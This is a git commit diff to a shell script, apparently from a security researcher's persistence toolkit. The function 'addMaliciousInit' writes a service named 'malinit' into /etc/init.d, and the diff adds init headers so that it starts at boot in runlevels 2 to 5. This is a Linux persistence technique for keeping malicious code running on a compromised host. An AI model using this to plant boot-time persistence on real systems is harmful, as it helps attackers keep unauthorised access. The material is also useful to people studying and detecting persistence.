05b0e7aec87d68e5601ee30580fa22fc1fd75260
matheuz <88067225+MatheuZSecurity@users.noreply.github.com>
2024-03-01 11:29:25 -0300

    Update init.sh

--- scripts/init.sh
+++ scripts/init.sh
@@ -9,7 +9,15 @@ read -p "Path to your file: " filepath
 
 function addMaliciousInit() {
     cat > /etc/init.d/malinit <<EOF
-#!/bin/sh
+#!/bin/bash
+
+### BEGIN INIT INFO
+# Provides:          malinit
+# Required-Start:    $local_fs $network $syslog
+# Required-Stop:     $local_fs $network $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+### END INIT INFO
 
 do_start()
 {
